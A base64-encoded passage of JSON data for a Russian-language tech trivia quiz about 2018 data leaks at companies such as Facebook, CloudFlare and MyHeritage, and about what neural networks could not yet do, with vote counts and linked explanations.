A0MzVcdTA0M2FcdTA0MzBcdTA0M2JcdTA0MzhcdTAwYmIgXHUwNDNmXHUwNDM1XHUwNDQwXHUwNDQxXHUwNDNlXHUwNDNkXHUwNDMwXHUwNDNiXHUwNDRjXHUwNDNkXHUwNDRiXHUwNDM1IFx1MDQzNFx1MDQzMFx1MDQzZFx1MDQzZFx1MDQ0Ylx1MDQzNSAoXHUwNDNkXHUwNDMwXHUwNDM0XHUwNDM1XHUwNDM1XHUwNDNjXHUwNDQxXHUwNDRmKT88XC9wPlxuIiwicXVpel9pZCI6IjY0Iiwidm90ZWQiOiIxNDk2IiwiYW5zd2VyX3R5cGUiOiJjaXJjbGUiLCJhbnN3ZXJzIjpbeyJpZCI6IjE4NjkiLCJxdWVzdGlvbl9pZCI6IjUyOSIsInRleHQiOiJGYWNlYm9vayIsImRlc2NyIjoiPHA+XHUwNDEyIFx1MDQzY1x1MDQzMFx1MDQ0MFx1MDQ0Mlx1MDQzNSBcdTA0NDFcdTA0NDJcdTA0MzBcdTA0M2JcdTA0M2UgXHUwNDM4XHUwNDM3XHUwNDMyXHUwNDM1XHUwNDQxXHUwNDQyXHUwNDNkXHUwNDNlIFx1MDQzZVx1MDQzMSA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL2FydGljbGVzXC9mYWNlYm9vay1zdG9yeVwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQ0M1x1MDQ0Mlx1MDQzNVx1MDQ0N1x1MDQzYVx1MDQzNTxcL2E+IFx1MDQzNFx1MDQzMFx1MDQzZFx1MDQzZFx1MDQ0Ylx1MDQ0NSA1MCBcdTA0M2NcdTA0M2JcdTA0M2QgXHUwNDNmXHUwNDNlXHUwNDNiXHUwNDRjXHUwNDM3XHUwNDNlXHUwNDMyXHUwNDMwXHUwNDQyXHUwNDM1XHUwNDNiXHUwNDM1XHUwNDM5IEZhY2Vib29rLiBcdTA0MWVcdTA0M2RcdTA0MzggXHUwNDM4XHUwNDQxXHUwNDNmXHUwNDNlXHUwNDNiXHUwNDRjXHUwNDM3XHUwNDNlXHUwNDMyXHUwNDMwXHUwNDNiXHUwNDM4XHUwNDQxXHUwNDRjIFx1MDQzNFx1MDQzYlx1MDQ0ZiBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0MzRcdTA0MzBcdTA0MzZcdTA0MzggXHUwNDQyXHUwNDMwXHUwNDQwXHUwNDMzXHUwNDM1XHUwNDQyXHUwNDM4XHUwNDQwXHUwNDNlXHUwNDMyXHUwNDMwXHUwNDNkXHUwNDNkXHUwNDNlXHUwNDM5IFx1MDQzZlx1MDQzZVx1MDQzYlx1MDQzOFx1MDQ0Mlx1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQzZVx1MDQzOSBcdTA0NDBcdTA0MzVcdTA0M2FcdTA0M2JcdTA0MzBcdTA0M2NcdTA0NGIgXHUwNDNmXHUwNDM1XHUwNDQwXHUwNDM1XHUwNDM0IFx1MDQzMlx1MDQ0Ylx1MDQzMVx1MDQzZVx1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzOCBcdTA0M2ZcdTA0NDBcdTA0MzVcdTA0MzdcdTA0MzhcdTA0MzRcdTA0MzVcdTA0M2RcdTA0NDJcdTA0MzAgXHUwNDIxXHUwNDI4XHUwNDEwLiBcdTA0MTAgXHUwNDQzXHUwNDM2XHUwNDM1IFx1MDQzMiBcdTA0NDFcdTA0MzVcdTA0M2RcdTA0NDJcdTA0NGZcdTA0MzFcdTA0NDBcdTA0MzUgXHUwNDNhXHUwNDNlXHUwNDNjXHUwNDNmXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRmIDxhIGhyZWY9XCJodHRwczpcL1wvbmV3c3Jvb20uZmIuY29tXC9uZXdzXC8yMDE4XC8xMFwvdXBkYXRlLW9uLXNlY3VyaXR5LWlzc3VlXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDQwXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDNhXHUwNDMwXHUwNDM3XHUwNDMwXHUwNDNiXHUwNDMwPFwvYT4gXHUwNDNlIFx1MDQzNVx1MDQ0OVx1MDQ1MSBcdTA0M2VcdTA0MzRcdTA0M2RcdTA0M2VcdTA0MzkgXHUwNDQzXHUwNDQyXHUwNDM1XHUwNDQ3XHUwNDNhXHUwNDM1LiBcdTA0MjVcdTA0MzBcdTA0M2FcdTA0MzVcdTA0NDBcdTA0NGIgXHUwNDNmXHUwNDNlXHUwNDNiXHUwNDQzXHUwNDQ3XHUwNDM4XHUwNDNiXHUwNDM4IFx1MDQzNFx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQ0M1x1MDQzZiBcdTA0M2EgXHUwNDNmXHUwNDM1XHUwNDQwXHUwNDQxXHUwNDNlXHUwNDNkXHUwNDMwXHUwNDNiXHUwNDRjXHUwNDNkXHUwNDNlXHUwNDM5IFx1MDQzOFx1MDQzZFx1MDQ0NFx1MDQzZVx1MDQ0MFx1MDQzY1x1MDQzMFx1MDQ0Nlx1MDQzOFx1MDQzOCBcdTA0M2VcdTA0M2FcdTA0M2VcdTA0M2JcdTA0M2UgMzAgXHUwNDNjXHUwNDNiXHUwNDNkIFx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQzZVx1MDQzMlx1MDQzMFx1MDQ0Mlx1MDQzNVx1MDQzYlx1MDQzNVx1MDQzOSwgXHUwNDMyXHUwNDNlXHUwNDQxXHUwNDNmXHUwNDNlXHUwNDNiXHUwNDRjXHUwNDM3XHUwNDNlXHUwNDMyXHUwNDMwXHUwNDMyXHUwNDQ4XHUwNDM4XHUwNDQxXHUwNDRjIFx1MDQzMVx1MDQzMFx1MDQzM1x1MDQzZVx1MDQzYyBcdTA0MzIgXHUwNDNhXHUwNDNlXHUwNDM0XHUwNDM1LiA8XC9wPlxuPHA+XHUwNDFkXHUwNDNlIFx1MDQzMlx1MDQzZVx1MDQ0MiBcdTA0MzhcdTA0MzcgTWljcm9zb2Z0IFx1MDQzMlx1MDQ0MFx1MDQzZVx1MDQzNFx1MDQzNSBcdTA0MzFcdTA0NGIgXHUwNDNkXHUwNDM4XHUwNDQ3XHUwNDM1XHUwNDMzXHUwNDNlIFx1MDQzZFx1MDQzNSBcdTA0NDNcdTA0NDJcdTA0MzVcdTA0M2FcdTA0MzBcdTA0M2JcdTA0M2UuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIxMzUiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg3MCIsInF1ZXN0aW9uX2lkIjoiNTI5IiwidGV4dCI6Ik1pY3Jvc29mdCIsImRlc2NyIjoiPHA+XHUwNDE0XHUwNDMwLCBcdTA0MzIgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMgXHUwNDNkXHUwNDM4XHUwNDNhXHUwNDQyXHUwNDNlIFx1MDQzZFx1MDQzNSBcdTA0NDFcdTA0M2JcdTA0NGJcdTA0NDhcdTA0MzBcdTA0M2IgXHUwNDNlXHUwNDMxIFx1MDQ0M1x1MDQ0Mlx1MDQzNVx1MDQ0N1x1MDQzYVx1MDQzMFx1MDQ0NSBcdTA0M2ZcdTA0MzVcdTA0NDBcdTA0NDFcdTA0M2VcdTA0M2RcdTA0MzBcdTA0M2JcdTA0NGNcdTA0M2RcdTA0NGJcdTA0NDUgXHUwNDM0XHUwNDMwXHUwNDNkXHUwNDNkXHUwNDRiXHUwNDQ1IFx1MDQzYVx1MDQzYlx1MDQzOFx1MDQzNVx1MDQzZFx1MDQ0Mlx1MDQzZVx1MDQzMiBcdTA0NGRcdTA0NDJcdTA0M2VcdTA0MzkgXHUwNDNhXHUwNDNlXHUwNDNjXHUwNDNmXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDM4LjxcL3A+XG4iLCJjb3JyZWN0IjoiMSIsInZvdGVkIjoiNTUwIiwiZm9yX3Jlc3VsdCI6Ii0xIn0seyJpZCI6IjE4NzEiLCJxdWVzdGlvbl9pZCI6IjUyOSIsInRleHQiOiJDbG91ZEZsYXJlIiwiZGVzY3IiOiI8cD5cdTA0MTIgXHUwNDNhXHUwNDNlXHUwNDNjXHUwNDNmXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDM4LCBcdTA0M2ZcdTA0NDBcdTA0MzVcdTA0MzRcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzBcdTA0MzJcdTA0M2JcdTA0NGZcdTA0NGVcdTA0NDlcdTA0MzVcdTA0MzkgXHUwNDQwXHUwNDMwXHUwNDM3XHUwNDNiXHUwNDM4XHUwNDQ3XHUwNDNkXHUwNDRiXHUwNDM1IFx1MDQ0MVx1MDQzNVx1MDQ0MFx1MDQzMlx1MDQzOFx1MDQ0MVx1MDQ0YiBcdTA0M2ZcdTA0M2UgXHUwNDNlXHUwNDMxXHUwNDQxXHUwNDNiXHUwNDQzXHUwNDM2XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRlIFx1MDQzOCBcdTA0M2VcdTA0MzFcdTA0MzVcdTA0NDFcdTA0M2ZcdTA0MzVcdTA0NDdcdTA0MzVcdTA0M2RcdTA0MzhcdTA0NGUgXHUwNDMxXHUwNDM1XHUwNDM3XHUwNDNlXHUwNDNmXHUwNDMwXHUwNDQxXHUwNDNkXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDM4IFx1MDQ0MVx1MDQzMFx1MDQzOVx1MDQ0Mlx1MDQzZVx1MDQzMiwgXHUwNDMyIFx1MDQ0NFx1MDQzNVx1MDQzMlx1MDQ0MFx1MDQzMFx1MDQzYlx1MDQzNSAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQzMCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2Nsb3VkZmxhcmUtbWFqb3ItbGVhay1jbG91ZGJsZWVkXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNmXHUwNDQwXHUwNDNlXHUwNDM4XHUwNDM3XHUwNDNlXHUwNDQ4XHUwNDNiXHUwNDMwPFwvYT4gXHUwNDQzXHUwNDQyXHUwNDM1XHUwNDQ3XHUwNDNhXHUwNDMwIFx1MDQzZlx1MDQzNVx1MDQ0MFx1MDQ0MVx1MDQzZVx1MDQzZFx1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQ0NSBcdTA0MzRcdTA0MzBcdTA0M2RcdTA0M2RcdTA0NGJcdTA0NDUsIFx1MDQzMiBcdTA0NDJcdTA0M2VcdTA0M2MgXHUwNDQ3XHUwNDM4XHUwNDQxXHUwNDNiXHUwNDM1IFx1MDQzYVx1MDQ0M1x1MDQzYVx1MDQzOCwgXHUwNDNhXHUwNDNiXHUwNDRlXHUwNDQ3XHUwNDM1XHUwNDM5IEFQSSBcdTA0MzggXHUwNDNmXHUwNDMwXHUwNDQwXHUwNDNlXHUwNDNiXHUwNDM1XHUwNDM5LiBcdTA0MWRcdTA0M2UgXHUwNDMyXHUwNDNlXHUwNDQyIFx1MDQzZVx1MDQzMSBcdTA0NDNcdTA0NDJcdTA0MzVcdTA0NDdcdTA0M2FcdTA0MzBcdTA0NDUgXHUwNDM4XHUwNDM3IE1pY3Jvc29mdCBcdTA0MzIgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMgXHUwNDNkXHUwNDM4XHUwNDNhXHUwNDQyXHUwNDNlIFx1MDQzZFx1MDQzNSBcdTA0NDFcdTA0M2JcdTA0NGJcdTA0NDhcdTA0MzBcdTA0M2IuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIzODIiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkwMyIsInF1ZXN0aW9uX2lkIjoiNTI5IiwidGV4dCI6Ik15SGVyaXRhZ2UiLCJkZXNjciI6IjxwPlx1MDQxMiBcdTA0MzhcdTA0NGVcdTA0M2RcdTA0MzUgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0MzAgXHUwNDMwXHUwNDM0XHUwNDNjXHUwNDM4XHUwNDNkXHUwNDM4XHUwNDQxXHUwNDQyXHUwNDQwXHUwNDMwXHUwNDQ2XHUwNDM4XHUwNDRmIFx1MDQzM1x1MDQzNVx1MDQzZFx1MDQzNVx1MDQzMFx1MDQzYlx1MDQzZVx1MDQzM1x1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQzZVx1MDQzM1x1MDQzZSBcdTA0NDFcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzAgTXlIZXJpdGFnZSA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL215aGVyaXRhZ2UtaHVnZS1kYXRhLWJyZWFjaFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzMlx1MDQ0Ylx1MDQzZlx1MDQ0M1x1MDQ0MVx1MDQ0Mlx1MDQzOFx1MDQzYlx1MDQzMDxcL2E+IFx1MDQzN1x1MDQzMFx1MDQ0Zlx1MDQzMlx1MDQzYlx1MDQzNVx1MDQzZFx1MDQzOFx1MDQzNSBcdTA0M2UgXHUwNDNjXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDM4XHUwNDMyXHUwNDNkXHUwNDNlXHUwNDM5IFx1MDQ0M1x1MDQ0Mlx1MDQzNVx1MDQ0N1x1MDQzYVx1MDQzNSBcdTA0MzRcdTA0MzBcdTA0M2RcdTA0M2RcdTA0NGJcdTA0NDUsIFx1MDQzN1x1MDQzMFx1MDQ0Mlx1MDQ0MFx1MDQzMFx1MDQzM1x1MDQzOFx1MDQzMlx1MDQzMFx1MDQ0ZVx1MDQ0OVx1MDQzNVx1MDQzOSBcdTA0M2JcdTA0MzhcdTA0NDdcdTA0M2RcdTA0NDNcdTA0NGUgXHUwNDM4XHUwNDNkXHUwNDQ0XHUwNDNlXHUwNDQwXHUwNDNjXHUwNDMwXHUwNDQ2XHUwNDM4XHUwNDRlIDkyIFx1MDQzY1x1MDQzYlx1MDQzZCBcdTA0M2ZcdTA0M2VcdTA0M2JcdTA0NGNcdTA0MzdcdTA0M2VcdTA0MzJcdTA0MzBcdTA0NDJcdTA0MzVcdTA0M2JcdTA0MzVcdTA0MzkuIFx1MDQxMCBcdTA0MzJcdTA0M2VcdTA0NDIgXHUwNDNlXHUwNDMxIFx1MDQ0M1x1MDQ0Mlx1MDQzNVx1MDQ0N1x1MDQzYVx1MDQzMFx1MDQ0NSBcdTA0MzhcdTA0MzcgTWljcm9zb2Z0IFx1MDQzMiAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0MyBcdTA0M2RcdTA0MzhcdTA0M2FcdTA0NDJcdTA0M2UgXHUwNDNkXHUwNDM1IFx1MDQ0MVx1MDQzYlx1MDQ0Ylx1MDQ0OFx1MDQzMFx1MDQzYi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjQyNiIsImZvcl9yZXN1bHQiOiItMSJ9XX0seyJpZCI6IjUzMCIsInRleHQiOiI8cD5cdTA0MjdcdTA0NDJcdTA0M2UgKFx1MDQzZlx1MDQzZVx1MDQzYVx1MDQzMCkgXHUwNDNkXHUwNDM1IFx1MDQ0M1x1MDQzY1x1MDQzNVx1MDQzNVx1MDQ0MiBcdTA0MzRcdTA0MzVcdTA0M2JcdTA0MzBcdTA0NDJcdTA0NGMgXHUwNDNkXHUwNDM1XHUwNDM5XHUwNDQwXHUwNDNlXHUwNDNkXHUwNDNkXHUwNDMwXHUwNDRmIFx1MDQ0MVx1MDQzNVx1MDQ0Mlx1MDQ0Yz88XC9wPlxuIiwicXVpel9pZCI6IjY0Iiwidm90ZWQiOiIxNDk2IiwiYW5zd2VyX3R5cGUiOiJjaXJjbGUiLCJhbnN3ZXJzIjpbeyJpZCI6IjE4NzMiLCJxdWVzdGlvbl9pZCI6IjUzMCIsInRleHQiOiJcdTA0MjBcdTA0MzBcdTA0MzdcdTA0MzNcdTA0MzBcdTA0MzRcdTA0NGJcdTA0MzJcdTA0MzBcdTA0NDJcdTA0NGMgXHUwNDNhXHUwNDMwXHUwNDNmXHUwNDQ3XHUwNDQzIiwiZGVzY3IiOiI8cD5cdTA0MTAgXHUwNDMyXHUwNDNlXHUwNDQyIFx1MDQzOCBcdTA0M2NcdTA0M2VcdTA0MzZcdTA0MzVcdTA0NDIhIFx1MDQxZFx1MDQzNVx1MDQzOVx1MDQ0MFx1MDQzZVx1MDQ0MVx1MDQzNVx1MDQ0Mlx1MDQ0YyA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2dhbi1hZ2FpbnN0LWNhcHRjaGFcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0NDBcdTA0MzBcdTA0NDFcdTA0M2ZcdTA0M2VcdTA0MzdcdTA0M2RcdTA0MzBcdTA0NTFcdTA0NDI8XC9hPiBcdTA0NDJcdTA0MzVcdTA0M2FcdTA0NDFcdTA0NDJcdTA0M2VcdTA0MzJcdTA0NDNcdTA0NGUgXHUwNDNhXHUwNDMwXHUwNDNmXHUwNDQ3XHUwNDQzIFx1MDQzN1x1MDQzMCAwLDA1IFx1MDQ0MVx1MDQzNVx1MDQzYVx1MDQ0M1x1MDQzZFx1MDQzNFx1MDQ0YiwgXHUwNDNkXHUwNDM1IFx1MDQ0Mlx1MDQ0MFx1MDQzNVx1MDQzMVx1MDQ0M1x1MDQ0ZiBcdTA0MzFcdTA0M2VcdTA0M2JcdTA0NGNcdTA0NDhcdTA0MzhcdTA0NDUgXHUwNDNjXHUwNDNlXHUwNDQ5XHUwNDNkXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDM1XHUwNDM5LiBcdTA0MWRcdTA0M2UgXHUwNDQwXHUwNDMwXHUwNDQxXHUwNDNmXHUwNDNlXHUwNDM3XHUwNDNkXHUwNDMwXHUwNDQyXHUwNDRjIFx1MDQzZVx1MDQzZlx1MDQ0Mlx1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQ0M1x1MDQ0ZSBcdTA0MzhcdTA0M2JcdTA0M2JcdTA0NGVcdTA0MzdcdTA0MzhcdTA0NGUgXHUwNDQzIFx1MDQxOFx1MDQxOCBcdTA0M2ZcdTA0M2VcdTA0M2FcdTA0MzAgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9uZXVyYWwtbmV0d29ya3MtaWxsdXNpb25zXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNkXHUwNDM1IFx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0M1x1MDQ0N1x1MDQzMFx1MDQzNVx1MDQ0Mlx1MDQ0MVx1MDQ0ZjxcL2E+LjxcL3A+XG4iLCJjb3JyZWN0IjoiMCIsInZvdGVkIjoiMTE1IiwiZm9yX3Jlc3VsdCI6Ii0xIn0seyJpZCI6IjE4NzUiLCJxdWVzdGlvbl9pZCI6IjUzMCIsInRleHQiOiJcdTA0MWVcdTA0MzFcdTA0NGFcdTA0NGZcdTA0NDFcdTA0M2RcdTA0NGZcdTA0NDJcdTA0NGMgXHUwNDNmXHUwNDQwXHUwNDM4XHUwNDQ3XHUwNDM4XHUwNDNkXHUwNDRiIFx1MDQ0MVx1MDQzMlx1MDQzZVx1MDQzOFx1MDQ0NSBcdTA0MzRcdTA0MzVcdTA0MzlcdTA0NDFcdTA0NDJcdTA0MzJcdTA0MzhcdTA0MzkiLCJkZXNjciI6IjxwPlx1MDQxY1x1MDQzNVx1MDQzNlx1MDQzNFx1MDQ0M1x1MDQzZFx1MDQzMFx1MDQ0MFx1MDQzZVx1MDQzNFx1MDQzZFx1MDQzMFx1MDQ0ZiBcdTA0MzNcdTA0NDBcdTA0NDNcdTA0M2ZcdTA0M2ZcdTA0MzAgXHUwNDM4XHUwNDQxXHUwNDQxXHUwNDNiXHUwNDM1XHUwNDM0XHUwNDNlXHUwNDMyXHUwNDMwXHUwNDQyXHUwNDM1XHUwNDNiXHUwNDM1XHUwNDM5IFx1MDQzOCBcdTA0M2FcdTA0M2VcdTA0M2NcdTA0MzBcdTA0M2RcdTA0MzRcdTA0MzAgRmFjZWJvb2sgQUkgUmVzZWFyY2ggPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9haS1sZWFybmVkLXRvLWV4cGxhaW4tY2F1c2VzXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNkXHUwNDMwXHUwNDQzXHUwNDQ3XHUwNDM4XHUwNDNiXHUwNDM4PFwvYT4gXHUwNDNkXHUwNDM1XHUwNDM5XHUwNDQwXHUwNDNlXHUwNDQxXHUwNDM1XHUwNDQyXHUwNDRjIFx1MDQzOCBcdTA0NGRcdTA0NDJcdTA0M2VcdTA0M2NcdTA0NDMuIFx1MDQxMCBcdTA0MzJcdTA0M2VcdTA0NDIgXHUwNDQwXHUwNDMwXHUwNDQxXHUwNDNmXHUwNDNlXHUwNDM3XHUwNDNkXHUwNDMwXHUwNDMyXHUwNDMwXHUwNDQyXHUwNDRjIFx1MDQzZVx1MDQzZlx1MDQ0Mlx1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQzOFx1MDQzNSBcdTA0MzhcdTA0M2JcdTA0M2JcdTA0NGVcdTA0MzdcdTA0MzhcdTA0MzggXHUwNDNkXHUwNDM1XHUwNDM5XHUwNDQwXHUwNDNlXHUwNDQxXHUwNDM1XHUwNDQyXHUwNDRjIFx1MDQzZlx1MDQzZVx1MDQzYVx1MDQzMCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL25ldXJhbC1uZXR3b3Jrcy1pbGx1c2lvbnNcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0M2RcdTA0MzUgXHUwNDNjXHUwNDNlXHUwNDM2XHUwNDM1XHUwNDQyPFwvYT4uPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiI2MzUiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg3NiIsInF1ZXN0aW9uX2lkIjoiNTMwIiwidGV4dCI6Ilx1MDQyMFx1MDQzMFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzN1x1MDQzZFx1MDQzMFx1MDQzMlx1MDQzMFx1MDQ0Mlx1MDQ0YyBcdTA0M2VcdTA0M2ZcdTA0NDJcdTA0MzhcdTA0NDdcdTA0MzVcdTA0NDFcdTA0M2FcdTA0MzhcdTA0MzUgXHUwNDM4XHUwNDNiXHUwNDNiXHUwNDRlXHUwNDM3XHUwNDM4XHUwNDM4IiwiZGVzY3IiOiI8cD5cdTA0MTRcdTA0MzAsIFx1MDQ0MSBcdTA0NGRcdTA0NDJcdTA0MzhcdTA0M2MgXHUwNDQzIFx1MDQzZFx1MDQzNVx1MDQzOVx1MDQ0MFx1MDQzZVx1MDQ0MVx1MDQzNVx1MDQ0Mlx1MDQzNVx1MDQzOSBcdTA0M2ZcdTA0M2VcdTA0M2FcdTA0MzAgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9uZXVyYWwtbmV0d29ya3MtaWxsdXNpb25zXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNmXHUwNDQwXHUwNDNlXHUwNDMxXHUwNDNiXHUwNDM1XHUwNDNjXHUwNDRiPFwvYT4uPFwvcD5cbiIsImNvcnJlY3QiOiIxIiwidm90ZWQiOiIzNjgiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkwNCIsInF1ZXN0aW9uX2lkIjoiNTMwIiwidGV4dCI6Ilx1MDQxZlx1MDQzOFx1MDQ0MVx1MDQzMFx1MDQ0Mlx1MDQ0YyBcdTA0NDFcdTA0MzVcdTA0MzFcdTA0NGYgIiwiZGVzY3IiOiI8cD5cdTA0MWRcdTA0MzVcdTA0NDIsIFx1MDQzMiAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0MyBcdTA0M2RcdTA0MzVcdTA0MzlcdTA0NDBcdTA0M2VcdTA0NDFcdTA0MzVcdTA0NDJcdTA0NGMgXHUwNDNkXHUwNDMwXHUwNDQzXHUwNDQ3XHUwNDM4XHUwNDNiXHUwNDMwXHUwNDQxXHUwNDRjIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvYmF5b3UtYWktd3JpdGUtamF2YS1jb2RlXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNmXHUwNDM4XHUwNDQxXHUwNDMwXHUwNDQyXHUwNDRjPFwvYT4gXHUwNDQxXHUwNDM1XHUwNDMxXHUwNDRmIFx1MDQzZFx1MDQzMCBKYXZhLiBcdTA0MTAgXHUwNDMyXHUwNDNlXHUwNDQyIFx1MDQ0MSBcdTA0M2VcdTA0M2ZcdTA0NDJcdTA0MzhcdTA0NDdcdTA0MzVcdTA0NDFcdTA0M2FcdTA0MzhcdTA0M2NcdTA0MzggXHUwNDM4XHUwNDNiXHUwNDNiXHUwNDRlXHUwNDM3XHUwNDM4XHUwNDRmXHUwNDNjXHUwNDM4IFx1MDQ0MyBcdTA0M2RcdTA0MzVcdTA0MzlcdTA0NDBcdTA0M2VcdTA0NDFcdTA0MzVcdTA0NDJcdTA0MzVcdTA0MzkgXHUwNDNmXHUwNDNlXHUwNDNhXHUwNDMwIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvbmV1cmFsLW5ldHdvcmtzLWlsbHVzaW9uc1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzMVx1MDQzYlx1MDQzNVx1MDQzY1x1MDQ0YjxcL2E+LjxcL3A+XG4iLCJjb3JyZWN0IjoiMCIsInZvdGVkIjoiMzc2IiwiZm9yX3Jlc3VsdCI6Ii0xIn1dfSx7ImlkIjoiNTMxIiwidGV4dCI6IjxwPlx1MDBhYkRvIHRoZSByaWdodCB0aGluZy4gRG9uXHUyMDE5dCBiZSBldmlsXHUwMGJiLiBcdTA0MjMgXHUwNDNhXHUwNDMwXHUwNDNhXHUwNDNlXHUwNDM5IFx1MDQzYVx1MDQzZVx1MDQzY1x1MDQzZlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQzOCBcdTA0NDJcdTA0MzBcdTA0M2FcdTA0MzhcdTA0MzUgXHUwNDM0XHUwNDM1XHUwNDMyXHUwNDM4XHUwNDM3XHUwNDRiPzxcL3A+XG4iLCJxdWl6X2lkIjoiNjQiLCJ2b3RlZCI6IjE0OTYiLCJhbnN3ZXJfdHlwZSI6ImNpcmNsZSIsImFuc3dlcnMiOlt7ImlkIjoiMTg3NyIsInF1ZXN0aW9uX2lkIjoiNTMxIiwidGV4dCI6Ik1pY3Jvc29mdCIsImRlc2NyIjoiPHA+XHUwNDFkXHUwNDM1XHUwNDQyLCBcdTA0MzRcdTA0MzVcdTA0MzJcdTA0MzhcdTA0MzcgTWljcm9zb2Z0OiBcdTAwYWJZb3VyIHBvdGVudGlhbC4gT3VyIHBhc3Npb25cdTAwYmIuIFx1MDQxMCBcdTA0MzJcdTA0M2VcdTA0NDIgXHUwNDQzIEdvb2dsZSBcdTA0M2FcdTA0MzBcdTA0M2EgXHUwNDQwXHUwNDMwXHUwNDM3IFx1MDQ0Mlx1MDQzMFx1MDQzYVx1MDQzOFx1MDQzNSBcdTA0NDFcdTA0M2JcdTA0M2VcdTA0MzNcdTA0MzBcdTA0M2RcdTA0NGIuIFx1MDQxMlx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0N1x1MDQzNVx1MDQzYywgXHUwNDNlXHUwNDQyIFx1MDBhYkRvblx1MjAxOXQgYmUgZXZpbFx1MDBiYiBcdTA0M2FcdTA0M2VcdTA0M2NcdTA0M2ZcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9pcy1ldmlsLW9rLW5vd1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQzZVx1MDQ0N1x1MDQ0Mlx1MDQzOCBcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzBcdTA0MzdcdTA0MzBcdTA0M2JcdTA0MzBcdTA0NDFcdTA0NGM8XC9